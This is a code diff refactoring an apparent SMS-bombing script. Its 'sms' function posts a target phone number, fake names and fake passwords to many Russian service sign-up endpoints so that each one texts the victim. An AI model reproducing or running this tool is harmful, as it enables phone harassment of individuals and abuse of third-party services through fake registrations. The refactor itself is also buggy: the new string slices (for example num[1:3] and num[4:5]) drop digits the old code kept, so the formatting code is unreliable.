 						"instanceId": "123",
 						"firstName": "Пупкин",
@@ -4039,23 +3383,7 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -4082,25 +3410,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/plain, */*',
@@ -4188,42 +3498,12 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:5]}-{num[7:8]}-{num[9:10]}'
 
-					nn1 = ''
-					nn2 = ''
-					nn3 = ''
-					nn4 = ''
-
-					nn1 += num[1]
-					nn1 += num[2]
-					nn1 += num[3]
-
-					nn2 += num[4]
-					nn2 += num[5]
-					nn2 += num[6]
-
-					nn3 += num[7]
-					nn3 += num[8]
-
-					nn4 += num[9]
-					nn4 += num[10]
+					nn1 = num[1:3]
+					nn2 = num[4:5]
+					nn3 = num[7:8]
+					nn4 = num[9:10]
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -4293,24 +3573,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = number
-					num2 = ""
-					num2 += "+"
-					num2 += code
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]}-{num[7:10]}'
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -4346,23 +3609,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} {num[1:3]} {num[4:5]}-{num[7:8]}-{num[9:10]}'
+					
 					requests.post("https://myspar.ru/local/ajax/user/reg/", files={'phone': (None, num2), 'name': (None, 'Вася'), 'last_name': (None, 'Пупкин'), 'gender': (None, 'male'), 'birthday': (None, '11.11.1999'), 'email': (None, 'hgy2djererhrh@hotmail.com'), 'username': (None, number), 'pass': (None, 'resgswergwergwergew'), 'pass_confirm': (None, 'resgswergwergwergew'), 'is_card': (None, 'new'), 'confirm': (None, 'Y')})
 				except:
 					pass
@@ -4420,25 +3668,8 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = number
-					num2=""
-					num2+="+"
-					num2+=code
-					num2+=' '
-					num2+="("
-					num2+=num[1]
-					num2+=num[2]
-					num2+=num[3]
-					num2+=")"
-					num2+=' '
-					num2+=num[4]
-					num2+=num[5]
-					num2+=num[6]
-					num2+='-'
-					num2+=num[7]
-					num2+=num[8]
-					num2+='-'
-					num2+=num[9]
-					num2+=num[10]
+					num2 = f'+{code} ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
+					
 					payload = {"phone":num2,"g-recaptcha-response":"null"}
 					requests.post("https://1603.smartomato.ru/account/session", json=payload)
 				except:
@@ -4461,23 +3692,7 @@ def sms(prx, number, tm, code):
 
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7({num[1:3]}){num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -4568,25 +3783,7 @@ def sms(prx, number, tm, code):
 					pass	
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'accept': '*/*',
@@ -4763,25 +3960,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': 'application/json, text/plain, */*',
@@ -4869,42 +4048,12 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+{code}({num[1:3]}){num[4:5]}-{num[7:8]}-{num[9:10]}'
 
-					nn1 = ''
-					nn2 = ''
-					nn3 = ''
-					nn4 = ''
-
-					nn1 += num[1]
-					nn1 += num[2]
-					nn1 += num[3]
-
-					nn2 += num[4]
-					nn2 += num[5]
-					nn2 += num[6]
-
-					nn3 += num[7]
-					nn3 += num[8]
-
-					nn4 += num[9]
-					nn4 += num[10]
+					nn1 = num[1:3]
+					nn2 = num[4:5]
+					nn3 = num[7:8]
+					nn4 = num[9:10]
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -4974,24 +4123,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:5]}-{num[7:10]}'
 
 					header = {
 						'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -5080,25 +4212,8 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+
+					num2 = f'+7 ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': '*/*',
@@ -5197,25 +4312,7 @@ def sms(prx, number, tm, code):
 					pass
 				try:
 					num = code+number
-					num2 = ""
-					num2 += "+"
-					num2 += '7'
-					num2 += ' '
-					num2 += '('
-					num2 += num[1]
-					num2 += num[2]
-					num2 += num[3]
-					num2 += ')'
-					num2 += ' '
-					num2 += num[4]
-					num2 += num[5]
-					num2 += num[6]
-					num2 += '-'
-					num2 += num[7]
-					num2 += num[8]
-					num2 += '-'
-					num2 += num[9]
-					num2 += num[10]
+					num2 = f'+7 ({num[1:3]}) {num[4:5]}-{num[7:8]}-{num[9:10]}'
 
 					header = {
 						'Accept': '*/*',
@@ -5289,6 +4386,7 @@ def sms(prx, number, tm, code):
 					num2 += num[8]
 					num2 += num[9]
 					num2 += num[10]
+					num2 = f'7-{num[1:10]}'
 
 					header = {
 						'accept': '*/*',
